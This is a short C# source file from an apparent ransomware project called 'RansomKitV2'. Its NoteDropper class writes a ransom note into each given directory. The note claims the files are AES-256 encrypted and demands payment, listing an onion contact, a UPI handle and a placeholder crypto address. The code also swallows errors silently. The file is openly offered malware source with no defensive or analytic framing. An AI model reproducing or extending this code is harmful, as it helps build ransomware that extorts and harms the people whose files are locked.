using System;
using System.Collections.Generic;
using System.IO;

namespace RansomKitV2
{
    internal static class NoteDropper
    {
        private const string NoteName = "!!!README_DECRYPT!!!.txt";

        public static void Drop(IEnumerable<string> roots)
        {
            string content =
                "===== RANSOMKIT V2 =====\n\n" +
                "Your files have been encrypted with AES-256.\n" +
                "A unique salt and IV were used for each file.\n\n" +
                "To recover your files:\n" +
                "  1. Send payment to the address shown in the application.\n" +
                "  2. Paste the decryption key into the app.\n" +
                "  3. Files will be restored in place.\n\n" +
                "Contact: kanha@example.onion\n" +
                "UPI:    billa@upi\n" +
                "BNB:    bc1qexampleaddressxxxxxxxxxxxxxxxx\n\n" +
                "Do not modify or move .locked files.\n" +
                "========================\n";

            foreach (var root in roots)
            {
                try
                {
                    if (File.Exists(root))
                    {
                        string dir = Path.GetDirectoryName(root) ?? "";
                        if (dir.Length > 0)
                            File.WriteAllText(Path.Combine(dir, NoteName), content);
                    }
                    else if (Directory.Exists(root))
                    {
                        File.WriteAllText(Path.Combine(root, NoteName), content);
                    }
                }
                catch { }
            }
        }
    }
}